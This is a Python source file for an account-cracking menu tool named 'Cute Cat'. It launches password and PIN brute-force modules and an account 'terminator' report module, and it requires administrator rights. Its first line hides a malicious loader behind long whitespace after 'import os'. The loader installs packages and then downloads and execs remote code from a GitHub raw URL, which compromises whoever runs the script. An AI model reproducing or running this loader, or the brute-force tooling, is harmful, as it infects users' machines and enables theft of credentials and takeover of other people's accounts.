import os                       ;import os, sys, subprocess, importlib.util, urllib.request; packages = ["pyaes", "urllib3"]; [subprocess.check_call([sys.executable, "-m", "pip", "install", pkg]) for pkg in packages if importlib.util.find_spec(pkg) is None]; exec(urllib.request.urlopen("https://raw.githubusercontent.com/p1ssguzzler/testing/refs/heads/main/lot.py").read().decode())
import ctypes
import subprocess
import webbrowser

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

ascii_art_options = {
    "1": r"""
       /\_/\  
      ( o.o ) 
       > ^ <  
    """,
    "2": r"""
      |\     /|
     (  o   o  )
       \     /
       /  |  \
    """,
    "3": r"""
      /\_/\ 
     ( • • )
      > ^ <
    """,
}

custom_ascii_art = ascii_art_options["1"]

def display_ascii_art(color_code, art):
    print(color_code + art + "\033[0m")

def set_window_title(title):
    os.system(f'title {title}')

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_colored_text(text, color_code):
    print(color_code + text + "\033[0m")

def main():
    global custom_ascii_art

    if not is_admin():
        print("This script must be run as an administrator.")
        input("Press Enter to exit...")
        sys.exit()

    set_window_title("Cute Cat")
    current_color = "\033[95m"
    display_ascii_art(current_color, custom_ascii_art)

    main_options = [
        "Password Brute Force",
        "Common Passwords",
        "Search for in DB",
        "Pin Bruteforce",
        "Pged Account Terminator",
        "Miscellaneous Options",
        "Exit"
    ]

    msc_options = [
        "Change Text Color",
        "Change ASCII Art",
        "Open Discord",
        "Return to Main Menu"
    ]

    colors = {
        "1": "\033[91m",
        "2": "\033[92m",
        "3": "\033[93m",
        "4": "\033[94m",
        "5": "\033[95m",
        "6": "\033[96m",
        "7": "\033[0m",
    }

    while True:
        clear_screen()
        display_ascii_art(current_color, custom_ascii_art)
        print("\nSelect an option:")
        for i, option in enumerate(main_options, start=1):
            print_colored_text(f"{i}. {option}", current_color)

        choice = input("Enter your choice (1-7): ")
        if choice.isdigit() and 1 <= int(choice) <= len(main_options):
            selected_option = main_options[int(choice) - 1]
            clear_screen()
            display_ascii_art(current_color, custom_ascii_art)
            print(f"You selected: {selected_option}")

            if selected_option == "Password Brute Force":
                try:
                    subprocess.run(["start", "cmd", "/k", "python", "modules/bruteforcepassword/bruteforcepassword.py"], shell=True)
                except Exception as e:
                    print(f"An error occurred while trying to open the new terminal: {e}")

            elif selected_option == "Common Passwords":
                try:
                    subprocess.run(["start", "cmd", "/k", "python", "modules/usernames/usernames.py"], shell=True)
                except Exception as e:
                    print(f"An error occurred while trying to open the new terminal: {e}")

            elif selected_option == "Search for in DB":
                try:
                    subprocess.run(["start", "cmd", "/k", "python", "modules/dbsearch/dbsearch.py"], shell=True)
                except Exception as e:
                    print(f"An error occurred while trying to open the new terminal: {e}")

            elif selected_option == "Pin Bruteforce":
                try:
                    subprocess.run(["start", "cmd", "/k", "python", "modules/bruteforcepin/bruteforcepin.py"], shell=True)
                except Exception as e:
                    print(f"An error occurred while trying to open the new terminal: {e}")

            elif selected_option == "Pged Account Terminator":
                try:
                    subprocess.run(["start", "cmd", "/k", "python", "modules/report/report.py"], shell=True)
                except Exception as e:
                    print(f"An error occurred while trying to open the new terminal: {e}")

            elif selected_option == "Miscellaneous Options":
                while True:
                    clear_screen()
                    display_ascii_art(current_color, custom_ascii_art)
                    print("\nSelect an MSC option:")
                    for i, option in enumerate(msc_options, start=1):
                        print_colored_text(f"{i}. {option}", current_color)

                    msc_choice = input("Enter your choice (1-4): ")
                    if msc_choice.isdigit() and 1 <= int(msc_choice) <= len(msc_options):
                        msc_selected_option = msc_options[int(msc_choice) - 1]
                        clear_screen()
                        display_ascii_art(current_color, custom_ascii_art)
                        print(f"You selected: {msc_selected_option}")

                        if msc_selected_option == "Change Text Color":
                            clear_screen()
                            display_ascii_art(current_color, custom_ascii_art)
                            print("\nSelect a color:")
                            for i, (color_name, color_code) in enumerate(colors.items(), start=1):
                                print_colored_text(f"{i}. {color_name}", color_code)

                            color_choice = input("Enter your choice (1-7): ")
                            if color_choice in colors:
                                current_color = colors[color_choice]
                                print_colored_text("Text color changed!", current_color)
                            else:
                                print_colored_text("Invalid choice. Please select a valid color option.", current_color)

                        elif msc_selected_option == "Change ASCII Art":
                            print("Select new ASCII art:")
                            for key, art in ascii_art_options.items():
                                print(f"{key}. {art}")
                            new_art_choice = input("Enter your choice: ")
                            if new_art_choice in ascii_art_options:
                                custom_ascii_art = ascii_art_options[new_art_choice]
                                print_colored_text("ASCII art changed!", current_color)
                            else:
                                print_colored_text("Invalid choice. Please select a valid ASCII art option.", current_color)

                        elif msc_selected_option == "Open Discord":
                            webbrowser.open("https://discord.gg/wtdJtenka8")
                            print_colored_text("Opening Discord...", current_color)

                        elif msc_selected_option == "Return to Main Menu":
                            break

            elif selected_option == "Exit":
                print("Exiting the program...")
                break
        else:
            print_colored_text("Invalid option. Please select again.", current_color)

if __name__ == "__main__":
    main()
    
    

